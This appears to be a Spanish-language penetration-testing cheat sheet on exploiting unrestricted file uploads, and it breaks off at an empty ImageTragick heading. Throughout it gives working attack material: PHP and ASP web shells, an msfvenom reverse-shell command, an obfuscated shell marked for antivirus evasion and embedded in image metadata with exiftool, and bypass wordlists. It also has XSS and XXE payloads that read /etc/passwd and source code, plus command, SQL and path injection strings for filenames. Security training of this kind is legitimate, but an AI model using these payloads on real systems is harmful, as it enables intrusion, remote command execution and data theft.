# Unrestricted File Upload

## Table of contents

- [Unrestricted File Upload](#unrestricted-file-upload)
  - [INTRO](#intro)
  - [HERRAMIENTAS](#herramientas)
  - [CARGA DE UNA WEB SHELL](#carga-de-una-web-shell)
  - [BYPASS CLIENT SIDE PROTECTION](#bypass-client-side-protection)
    - [Modificación de solicitud de back-end](#modificacin-de-solicitud-de-back-end)
    - [Deshabilitar la validación de front-end](#deshabilitar-la-validacin-de-front-end)
  - [BYPASS FILE EXTENSION](#bypass-file-extension)
    - [BLACKLIST BYPASS](#blacklist-bypass)
      - [Extension fuzzing](#extension-fuzzing)
    - [WHITELIST BYPASS](#whitelist-bypass)
      - [Extensiones Dobles](#extensiones-dobles)
      - [Extensión doble inversa](#extensin-doble-inversa)
    - [Inyección de personajes](#inyeccin-de-personajes)
  - [BYPASS CONTENT-TYPE HEADER](#bypass-content-type-header)
  - [BYPASS MIME TYPE](#bypass-mime-type)
  - [MAGIC NUMBER](#magic-number)
  - [Cargas de archivos limitadas](#cargas-de-archivos-limitadas)
    - [XSS](#xss)
    - [XXE](#xxe)
    - [DOS](#dos)
    - [Inyecciones en nombre de archivo](#inyecciones-en-nombre-de-archivo)
  - [PROBAR OTRAS VULNERABILIDADES A TRAVES DEL NOMBRE DEL ARCHIVO (XSS, SQLi, LFI)](#probar-otras-vulnerabilidades-a-traves-del-nombre-del-archivo-xss-sqli-lfi)
  - [ImageTragick Exploitation – CVE-2016-3714](#imagetragick-exploitation--cve-2016-3714)
    - [COMO ARREGLAR ESTA VULNERABILIDAD](#como-arreglar-esta-vulnerabilidad)
  - [FILE UPLOAD + LFI](#file-upload--lfi)
  - [BYPASS BLACKLIST EXTENSION (SERVIDOR APACHE HTTP)](#bypass-blacklist-extension-servidor-apache-http)
    - [BRUTE FORCE EXTENSION](#brute-force-extension)
    - [MODIFICAR EL .HTACCESS](#modificar-el-htaccess)
  - [PRACTICING](#practicing)
 
## INTRO
 
 Una aplicación web dinámica, en algún lugar u otro, **permite** **a** **sus** **usuarios** **cargar** un **archivo** , ya sea una imagen, un currículum, una canción o cualquier cosa específica. Pero, ¿qué sucede si la aplicación no valida estos archivos cargados y los pasa directamente al servidor?
 
 Esto provoca ciertas vulnerabilidades en la carga de archivos, permitiendo obtener en el mejor de los casos un RCE.
 
## HERRAMIENTAS
 
 - [fuxploider](https://github.com/almandin/fuxploider)
 - [Burp Extension upload scaner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
 
## CARGA DE UNA WEB SHELL


>[!note]
>A la hora de intentar vulnerar una carga de archivos, primero cargar un archivo correctamente y capturar con Burpsuite para ver como lo manda, despues adaptamos nuestro ataque sobre ese request valido.
 
 Es importante saber el tipo de tecnologia que utiliza la pagina web, esto se puede hacer con **wappalyzer** o **whatweb**, esto para saber que lenguaje interpreta y poder buscar una web shell en ese lenguaje. Si la carga de archivos es muy pobre en protecciones y no valida la extension del archivo, podemos cargar, por ejemplo y si es el caso, un archivo **.php** malicioso.
 
 ```php
<?php  
	system($_GET["cmd"])
?>
 ```
o podemos generar con msfvenom:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

en .NET:

```asp
<% eval request('cmd') %>
```

 este simple archivo permite la ejecucion remota de comandos, se saber o ver la imagen donde se almacena, podemos invocarla y pasarle ese parametro para que lo ejecute como un comando de sistema:
 
 ```bash
 http://10.1.1.10/uploads/shell.php?cmd=whoami
 ```
 
 puede usar la [webshell de monkey pentester](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 **Otras extensiones útiles segun la tecnologia:**

-   **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
-   **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
-   **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
-   **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
-   **Flash**: _.swf_
-   **Perl**: _.pl, .cgi_
-   **Erlang Yaws Web Server**: _.yaws_

**NOTA: JUGAR CON EL INTRUDER Y ESTAS EXTENSIONES**

**webshells para varios lenguajes:**

- [https://github.com/xl7dev/WebShell](https://github.com/xl7dev/WebShell)

## BYPASS CLIENT SIDE PROTECTION

### Modificación de solicitud de back-end

Modifiquemos la carga de archivos antes de que llegue al servidor, por ejemplo si se acepta el formato `.png` cargamos un archivo con esa extension:

![[Pasted image 20230105093640.png]]

Las dos partes importantes de la solicitud son `filename` y su contenido, el contenido es la parte con rojo que muestra el burpsuite:

![[Pasted image 20230105093744.png]]

>[!tip]
>También podemos modificar la configuración `Content-Type` del archivo cargado.

### Deshabilitar la validación de front-end

Otro método para eludir las validaciones del lado del cliente es mediante la manipulación del código front-end. Como estas funciones se procesan completamente dentro de nuestro navegador web, tenemos control total sobre ellas.

![[Pasted image 20230105094034.png]]

Esto resaltará la siguiente entrada de archivo HTML en línea `18`:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Aquí, vemos que la entrada del archivo especifica (`.jpg,.jpeg,.png`) como los tipos de archivo permitidos dentro del cuadro de diálogo de selección de archivos. Sin embargo, podemos modificar esto fácilmente editando el codigo HTML.

La parte más interesante es `onchange="checkFile(this)"`, que parece ejecutar un código JavaScript cada vez que seleccionamos un archivo, que parece estar realizando la validación del tipo de archivo. Para obtener los detalles de esta función, desde la consola del navegador escribimos el nombre de la funcion:

![[Pasted image 20230105095340.png]]

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

podemos regresar a nuestro inspector, hacer clic nuevamente en la imagen de perfil, hacer doble clic en el nombre de la función ( `checkFile`) en línea `18` y eliminarlo:

![[Pasted image 20230105095444.png]]

Con la función `checkFile` eliminada de la entrada del archivo, deberíamos poder seleccionar nuestro webshell `PHP` a través del cuadro de diálogo de selección de archivos y cargarlo normalmente sin validaciones

>[!note]
>Estos cambios al ser la modificacion en el navegador, no son persistentes y se reestablecen en cada actualizacion.

## BYPASS FILE EXTENSION

>[!tip]
>**Sugerencia:** la comparación anterior también distingue entre mayúsculas y minúsculas y solo considera extensiones en minúsculas. En los servidores de Windows, los nombres de los archivos no distinguen entre mayúsculas y minúsculas, por lo que podemos intentar cargar un archivo `php` con una combinación de mayúsculas y minúsculas (p. ej `pHp`.), que también puede pasar por alto la lista negra y debería ejecutarse como un script PHP.

- En caso de aplicar, la **verificación** de las **prórrogas anteriores.** Pruébelos también usando algunas **letras mayúsculas** :_pHp, .pHP5, .PhAr ... 
- Verifique_ **agregar una extensión válida antes** _de la extensión de ejecución (use también extensiones anteriores):

puede que tenga una validacion como la siguiente:

```bash
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)
```

que hace un **split** del nombre del archivo por el caracter **.**, toma el segundo argumento y lo compara con una lista de extensiones validas, esto se puede bypassear facilmente agregando una doble extension:

- archivo.png.php
- archivo.png.Php5

 - Intente agregar **caracteres especiales al final.** Puede usar Burp para **aplicar fuerza bruta a** todos los caracteres **ASCII** y **Unicode** . ( Tenga en cuenta que también puede intentar usar las extensiones  **mencionadas** **anteriormente** )
    
-  file.php%20
-  file.php%0a
-  file.php%00
-  file.php%0d%0a
-  file.php/
-  file.php.\
-  file.
-  file.php....
-  file.pHp5....
        
- Intente eludir las protecciones que **engañan al analizador** de extensiones del lado del servidor con técnicas como **duplicar** la **extensión** o **agregar** datos basura ( bytes **nulos  entre extensiones.**). También puede usar las_**_extensiones anteriores_**
    
    -  archivo.png.php
    -  archivo.png.pHp5
    -  archivo.php%00.png
    -  archivo.php\x00.png
    -  archivo.php%0a.png
    -  archivo.php%0d%0a.png
    -  archivo.phpBasura123png
    
- Añade **otra capa de extensiones** a la comprobación anterior:
    
    -  archivo.png.jpg.php
    -  archivo.php%00.png%00.jpg
        
- Use la extensión doble inversa (útil para explotar las configuraciones incorrectas de Apache donde cualquier cosa con la extensión .php, pero que no necesariamente termina en .php ejecutará el código)
    
    - ej: archivo.php.png
        
- Trate de romper los límites de nombre de archivo. La extensión válida se corta. Y queda el PHP malicioso. AAA<--SNIP-->AAA.php

```bash
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### MODIFYING .HTACCESS

- [[#BYPASS BLACKLIST EXTENSION (SERVIDOR APACHE HTTP)]]

### BLACKLIST BYPASS

#### Extension fuzzing

Hay muchas listas de extensiones que podemos utilizar en nuestro escaneo fuzzing. `PayloadsAllTheThings` proporciona listas de extensiones para aplicaciones web [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) y [.NET .](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) También podemos usar una lista de `SecLists`:

- [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

```bash
jpeg.php
jpg.php
png.php
php
php3
php4
php5
php7
php8
pht
png
jpg
jpeg
svg
phar
phpt
pgif
phtml
phtm
php%00.gif
php\x00.gif
php%00.png
php\x00.png
php%00.jpg
php\x00.jpg
phtml
php
php3
php4
php5
inc  
pHtml
pHp
pHp3
pHp4
pHp5
iNc
iNc%00
iNc%20%20%20
iNc%20%20%20...%20.%20..
iNc......
inc%00
inc%20%20%20
inc%20%20%20...%20.%20..
inc......
pHp%00
pHp%20%20%20
pHp%20%20%20...%20.%20..
pHp......
pHp3%00
pHp3%20%20%20
pHp3%20%20%20...%20.%20..
pHp3......
pHp4%00
pHp4%20%20%20
pHp4%20%20%20...%20.%20..
pHp4......
pHp5%00
pHp5%20%20%20
pHp5%20%20%20...%20.%20..
pHp5......
pHtml%00
pHtml%20%20%20
pHtml%20%20%20...%20.%20..
pHtml......
php%00
php%20%20%20
php%20%20%20...%20.%20..
php......
php3%00
php3%20%20%20
php3%20%20%20...%20.%20..
php3......
php4%00
php4%20%20%20
php4%20%20%20...%20.%20..
php4......
php5%00
php5%20%20%20
php5%20%20%20...%20.%20..
php5......
phtml%00
phtml%20%20%20
phtml%20%20%20...%20.%20..
phtml......
asp
aspx
bat
c
cfm
cgi
css
com
dll
exe
htm
html
inc
jhtml
js
jsa
jsp
log
mdb
nsf
pcap
php
php2
php3
php4
php5
php6
php7
phps
pht
phtml
pl
reg
sh
shtml
sql
swf
txt
xml
# para los siguientes payloads debemos cambiar el content-type: image/png o image/jpg
.php.jpg
.php.png
.php.jpeg
.php5.jpg
.php5.png
.php5.jpeg
.phtml.jpg
.phtml.png
.phtml.jpeg
.phar.jpg
.phar.png
.phar.jpeg
```

Podemos ubicar nuestra última solicitud a `/upload.php`, hacer clic derecho sobre ella y seleccionar `Send to Intruder`. Desde la pestaña `Positions`, damos a `Clear` y podemos establecer posiciones automáticamente, y luego seleccionar la extensión`.php`, del nombre del archivo (`filename="HTB.php"`),  y hacer clic en el botón `Add` para agregarla como una posición de fuzzing:

![[Pasted image 20230105100414.png]]

a traves del codigo de estado o la longitud de la respuesta podemos ver cuales pueden ser validas:

![[Pasted image 20230105100520.png]]

### WHITELIST BYPASS

#### Extensiones Dobles

El siguiente es un ejemplo de una prueba de lista blanca de extensión de archivo:

Código: php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Vemos que el script usa una expresión regular (`regex`) para probar si el nombre del archivo contiene extensiones de imagen incluidas en la lista blanca. El problema aquí radica en el `regex`, ya que solo verifica si el nombre del archivo contiene tiene la extensión y no si realmente **termina** en esa extensión.

Por ejemplo, si se permitió la extensión `.jpg`, podemos agregarla en nuestro nombre de archivo cargado y aún terminar nuestro nombre de archivo con `.php` (por ejemplo `shell.jpg.php`), en cuyo caso deberíamos poder pasar la prueba de lista blanca, mientras cargamos un script PHP que puede ejecutar código PHP.

Interceptemos una solicitud de carga normal, modifiquemos el nombre del archivo a ( `shell.jpg.php`) y modifiquemos su contenido al de un shell web:

![[Pasted image 20230105102931.png]]

#### Extensión doble inversa

Sin embargo, es posible que esto no siempre funcione, ya que algunas aplicaciones web pueden usar un patrón estricto `regex`, como se mencionó anteriormente, como el siguiente:

Código: php

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

Este patrón solo debe considerar la extensión final del archivo, ya que usa (`^.*\.`) para hacer coincidir todo hasta el último (`.`), y luego usa (`$`) al final para hacer coincidir solo las extensiones que terminan con el nombre del archivo.

Una mala configuracion en el servidor puede especifica una lista blanca con un patrón de expresiones regulares que coincide con `.phar`, `.php` y `.phtml`. (U otras extensiones). **Cualquier archivo que contenga las extensiones anteriores podrá ejecutar código PHP, incluso si no termina con la extensión PHP.** Por ejemplo, el nombre del archivo ( `shell.php.jpg`) debería pasar la prueba de la lista blanca anterior ya que termina con ( `.jpg`), y podría ejecutar código PHP debido a la configuración incorrecta anterior, ya que contiene ( `.php`) en su nombre.

Intentemos interceptar una solicitud de carga de imagen normal y usemos el nombre de archivo anterior para pasar la prueba estricta de la lista blanca:

![[Pasted image 20230105105922.png]]

```bash
# para los siguientes payloads debemos cambiar el content-type: image/png o image/jpg
.php.jpg
.php.png
.php.jpeg
.php5.jpg
.php5.png
.php5.jpeg
.phtml.jpg
.phtml.png
.phtml.jpeg
.phar.jpg
.phar.png
.phar.jpeg
```

### Inyección de personajes

Finalmente, analicemos otro método para omitir una prueba de validación de lista blanca a través de `Character Injection`. Podemos inyectar varios caracteres antes o después de la extensión final para que la aplicación web malinterprete el nombre del archivo y ejecute el archivo cargado como un script PHP.

Los siguientes son algunos de los caracteres que podemos intentar inyectar:

-   `%20`
-   `%0a`
-   `%00`
-   `%0d0a`
-   `/`
-   `.\`
-   `.`
-   `…`
-   `:`

Cada carácter tiene un caso de uso específico que puede engañar a la aplicación web para que malinterprete la extensión del archivo. Por ejemplo, (`shell.php%00.jpg`) funciona con servidores PHP con una versión `5.X` o anterior, ya que hace que el servidor web PHP finalice el nombre del archivo después de ( `%00`) y lo almacene como ( `shell.php`), sin dejar de pasar la lista blanca.

Podemos escribir un pequeño script bash que genere todas las permutaciones del nombre del archivo, donde los caracteres anteriores se inyectarían antes y después de las extensiones `PHP` y `JPG`, de la siguiente manera:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Ahora podemos probar con el intruder.

## BYPASS CONTENT-TYPE HEADER

Si a pesar de modificar la extension del archivo seguimos recibiendo mensajes de error podemos intentar modificar el header `Content-Type` o el `File Content`. 

El siguiente es un ejemplo de cómo una aplicación web PHP prueba el encabezado Content-Type para validar el tipo de archivo:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Podemos comenzar fusionando el header contet-type con la lista [Content-Type List](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) de SecLists a través de Burp Intruder, para ver qué tipos están permitidos. Sin embargo, el mensaje nos dice que solo se permiten imágenes, por lo que podemos limitar nuestro escaneo a tipos de imágenes:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt

cat content-type.txt | grep 'image/' > image-content-types.txt
```

lo probamos con el intruder para ver cual nos acepta:

![[Pasted image 20230105111711.png]]

**Podemos combinar esto con la modificacion de la extension.**

>[!note]
>Una solicitud HTTP de carga de archivos tiene dos encabezados de tipo de contenido, uno para el archivo adjunto (en la parte inferior) y otro para la solicitud completa (en la parte superior). Por lo general, necesitamos modificar el encabezado de tipo de contenido del archivo, pero en algunos casos la solicitud solo contendrá el encabezado de tipo de contenido principal (por ejemplo, si el contenido cargado se envió como datos `POST`), en cuyo caso necesitaremos modificar el contenido principal.

## BYPASS MIME TYPE

Otra tecnica es probar el archivo `MIME-Type` (`Multipurpose Internet Mail Extensions (MIME)`) es un estándar de Internet que determina el tipo de un archivo a través de su formato general y estructura de bytes.

Esto generalmente se hace inspeccionando los primeros bytes del contenido del archivo, que contienen la [firma del archivo](https://en.wikipedia.org/wiki/List_of_file_signatures) o los [bytes mágicos](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime) . Por ejemplo, si un archivo comienza con (`GIF87a` o `GIF89a`), esto indica que es una imagen `GIF`, mientras que un archivo que comienza con texto sin formato generalmente se considera un archivo `Text`.

Los servidores web también pueden utilizar este estándar para determinar los tipos de archivo, lo que suele ser más preciso que probar la extensión del archivo. El siguiente ejemplo muestra cómo una aplicación web PHP puede probar el tipo MIME de un archivo cargado:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Como podemos ver, los tipos MIME son similares a los que se encuentran en los encabezados Content-Type, pero su origen es diferente, ya que PHP usa la función `mime_content_type()` para obtener el tipo MIME de un archivo.

intentemos agregar `GIF8` antes de nuestro código PHP para tratar de imitar una imagen GIF mientras mantenemos nuestra extensión de archivo como `.php`, por lo que ejecutaría el código PHP independientemente:

![[Pasted image 20230105115128.png]]

## MAGIC NUMBER

algunas paginas verifican que lo que se sube sea un archivo imagen como tal, ya que verifican el tamaño de la imagen y en caso de subir otro tipo de archivo ya sea con otra extension o doble extension devolvera un error, asi lo hace la funcion **getimagesize()** de PHP. Esto esta verificando que sea si o si una imagen. Todos los archivos tiene unos datos en hexadecimal segun sea el tipo de dato, esto se lo conoce como numeros magicos, logrando modificar estos numeros magicos podemos engañar y eludir esta proteccion haciendo creer que un archivo **.php** es una imagen a nivel de numeros magicos. Esto junto con la modificacion del content-Type y la doble extension por ejemplo es una bomba.

modificacion de los numeros magicos:

[https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/](https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/)

si creamos un archivo llamado `test.txt`, al verificar el tipo de archivo tendremos la siguiente salida:

```bash
test2.txt: ASCII text
```

si le cambiamos la extension a `test.txt.jpg` y volvemos a verificar el tipo de archivo nos saldra el mismo resultado, esto se debe a que los numeros magicos no esta modificados, para ello podemos hacer lo siguiente:

```bash
sudo apt install hexedit
```

abrimos el archivo con esa herramienta y modificamos los primeros bytes segun el tipo de dato a simular:

[https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

```bash
hexedit test.txt.jpg
```

una vez modificado damos **ctrl+x, yes y escribimos el nombre del archivo**, ahora si verificamos el tipo de archivo debera mostrar al cual modificamos los numeros magicos.


podemos tambien con **exiftools** agregar uhna sentencia PHP dentro de una imagen legitima para que se ejecute segun la configuracion del servidor:

tenemos la siguiente webshell:

```php
<?php  
 $cmd = $_GET["wreath"];  
 if(isset($cmd)){  
 echo "<pre>" . shell_exec($cmd) . "</pre>";  
 }  
 die();  
?>
```

en caso de tener un AV podemos ofuscarlo para su evasion:

[https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

resultado:

```php
<?php $l0=$_GET[base64_decode('d3JlYXRo')];if(isset($l0)){echo base64_decode('PHByZT4=').shell_exec($l0).base64_decode('PC9wcmU+');}die();?>
```

lo colocamos, escapando los caracteres especiales como $, denrto de la iumagen con **exiftool**

```bash
sudo apt install exiftool
```

```bash
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
```

lo cargamos y al invocarlo deberia funcionar la webshell.

## Cargas de archivos limitadas

Si bien los formularios de carga de archivos con filtros débiles pueden explotarse para cargar archivos arbitrarios, algunos formularios de carga tienen filtros seguros que pueden no ser explotables con las técnicas que discutimos. Sin embargo, incluso si se trata de un formulario de carga de archivos limitado (es decir, no arbitrario), que solo nos permite cargar tipos de archivos específicos, aún podemos realizar algunos ataques en la aplicación web.

Ciertos tipos de archivos, como `SVG`, `HTML`, `XML` e incluso algunos archivos de imágenes y documentos, pueden permitirnos introducir nuevas vulnerabilidades en la aplicación web al cargar versiones maliciosas de estos archivos.

>[!tip]
>Esta es la razón por la cual la fuzzing de las extensiones de archivo permitidas es un ejercicio importante para cualquier ataque de carga de archivos. Nos permite explorar qué ataques se pueden lograr en el servidor web.

### XSS

Muchos tipos de archivos pueden permitirnos introducir una vulnerabilidad `Stored XSS` en la aplicación web al cargar versiones de ellos creadas con fines malintencionados.

El ejemplo más básico es cuando una aplicación web nos permite subir archivos `HTML`. Aunque los archivos HTML no nos permitirán ejecutar código (p. ej., PHP), aún sería posible implementar código JavaScript dentro de ellos para realizar un ataque XSS o CSRF a cualquiera que visite la página HTML cargada. Si el objetivo ve un enlace de un sitio web en el que confía, y el sitio web es vulnerable a la carga de documentos HTML, es posible engañarlos para que visiten el enlace y lleven el ataque a sus máquinas.

Otro ejemplo de ataques XSS son las aplicaciones web que muestran los metadatos de una imagen después de cargarla. Para tales aplicaciones web, podemos incluir una carga útil XSS en uno de los parámetros de metadatos que aceptan texto sin procesar, como los parámetros `Comment` o `Artist`, de la siguiente manera:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

exiftool HTB.jpg

...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Podemos ver que el `Comment`parámetro se actualizó a nuestra carga útil XSS. Cuando se muestran los metadatos de la imagen, se debe activar la carga útil XSS y se ejecutará el código JavaScript para llevar a cabo el ataque XSS.

>[!tip]
>Si cambiamos el tipo MIME de la imagen a `text/html`, algunas aplicaciones web pueden mostrarla como un documento HTML en lugar de una imagen, en cuyo caso la carga útil de XSS se activaría incluso si los metadatos no se mostraran directamente.

Finalmente, los ataques XSS también se pueden realizar con imágenes `SVG`, junto con varios otros ataques. `Scalable Vector Graphics (SVG)`. Las imágenes están basadas en XML y describen gráficos vectoriales 2D, que el navegador convierte en una imagen. Por este motivo, podemos modificar sus datos XML para incluir una carga útil XSS. Por ejemplo, podemos escribir lo siguiente a `HTB.svg`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
```

Una vez que cargamos la imagen en la aplicación web, la carga útil de XSS se activará cada vez que se muestre la imagen.

### XXE

Se pueden llevar a cabo ataques similares para conducir a la explotación XXE. Con las imágenes SVG, también podemos incluir datos XML maliciosos para filtrar el código fuente de la aplicación web y otros documentos internos dentro del servidor. El siguiente ejemplo se puede usar para una imagen SVG que filtra el contenido de (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Una vez que se cargue y visualice la imagen SVG anterior, el documento XML se procesará y deberíamos obtener la información de (`/etc/passwd`) impresa en la página o mostrada en la fuente de la página. De manera similar, si la aplicación web permite la carga de documentos `XML`, la misma carga útil puede provocar el mismo ataque cuando los datos XML se muestran en la aplicación web.

ejemplo de peticion:

```bash
POST /contact/upload.php HTTP/1.1
Host: 138.68.182.130:30670
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------149256660527568199923809828290
Content-Length: 354
Origin: http://159.65.61.162:31295
Connection: close
Referer: http://159.65.61.162:31295/

-----------------------------149256660527568199923809828290
Content-Disposition: form-data; name="uploadFile"; filename="hola.phar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

-----------------------------149256660527568199923809828290--
```

>[!note]
>Tambien funciona con `Content-Type: image/png`

Para usar XXE para leer el código fuente en aplicaciones web PHP, podemos usar la siguiente carga útil en nuestra imagen SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Una vez que se muestra la imagen SVG, debemos obtener el contenido codificado en base64 `index.php`, que podemos decodificar para leer el código fuente.

### DOS

Podriamos intenter estos ataques:

- **Decompression Bomb:** Si una aplicación web descomprime automáticamente un archivo ZIP, es posible cargar un archivo malicioso que contenga archivos ZIP anidados en su interior, lo que eventualmente puede generar muchos petabytes de datos, lo que provoca un bloqueo en el servidor back-end.
- **Pixel Flood:** con algunos archivos de imagen que utilizan compresión de imagen, como `JPG` o `PNG`. Podemos crear cualquier archivo de imagen con cualquier tamaño de imagen (por ejemplo `500x500`, ) y luego modificar manualmente sus datos de compresión para decir que tiene un tamaño de ( `0xffff x 0xffff`), lo que da como resultado una imagen con un tamaño percibido de 4 gigapíxeles. Cuando la aplicación web intente mostrar la imagen, intentará asignar toda su memoria a esta imagen, lo que provocará un bloqueo en el servidor de back-end.

### Inyecciones en nombre de archivo

Un ataque común de carga de archivos utiliza una cadena maliciosa para el nombre del archivo cargado, que puede ejecutarse o procesarse si el nombre del archivo cargado se muestra (es decir, se refleja) en la página. Podemos intentar inyectar un comando en el nombre del archivo, y si la aplicación web usa el nombre del archivo dentro de un comando del sistema operativo, puede provocar un ataque de inyección de comando.

Por ejemplo, si nombramos un archivo `file$(whoami).jpg` o ``file`whoami`.jpg`` o `file.jpg||whoami`, luego la aplicación web intenta mover el archivo cargado con un comando del sistema operativo (p. ej `mv file /tmp`.), nuestro nombre de archivo inyectaría el comando `whoami`, que se ejecutaría, lo que llevaría a la ejecución remota del código.

De manera similar, podemos usar una carga útil XSS en el nombre del archivo (por ejemplo `<script>alert(window.origin);</script>`, ), que se ejecutaría en la máquina del objetivo si el nombre del archivo está deshabilitado para ellos. También podemos inyectar una consulta SQL en el nombre del archivo (p. ej `file';select+sleep(5);--.jpg`.), lo que puede conducir a una inyección SQL si el nombre del archivo se usa de forma insegura en una consulta SQL.

>[!tip]
>Podemos colocar cualquier caracter para provocar un error y podamos divulgar la ruta en donde se almacena los archivos.

## PROBAR OTRAS VULNERABILIDADES A TRAVES DEL NOMBRE DEL ARCHIVO (XSS, SQLi, LFI)

-   Time-Based SQLi Payloads 

```bash
poc.js'(select*from(select(sleep(20)))a)+'.extension
```
-   LFI Payloads

```bash
image.png../../../../../../../etc/passwd
```

-   XSS Payloads

```bash
'"><img src=x onerror=alert(document.domain)>.extension
```

-   File Traversal

```bash
../../../tmp/lol.png
```

-   Command Injection

```bash
; sleep 10;
```

## ImageTragick Exploitation – CVE-2016-3714

Este nombre se le ha dado a una vulnerabilidad crítica que afecta a [ImageMagick](https://www.imagemagick.org/) <= `6.9.3-9`.

ImageMagick es una utilidad de código abierto utilizada por numerosas aplicaciones para crear, editar, convertir o componer archivos de imagen. Según su documentación, esta utilidad puede leer y escribir más de 200 formatos de archivo de imagen. Personalmente, he usado ImageMagick en una de mis aplicaciones web para cambiar el tamaño de las imágenes de perfil cargadas por los usuarios, y conozco otras aplicaciones web que hacen lo mismo.

Para hacer un exploit que funcione, todo lo que tiene que hacer es copiar el siguiente código en su editor de texto favorito y guardarlo como una imagen (.jpg, .png, etc.).

```bash
# exploit.png
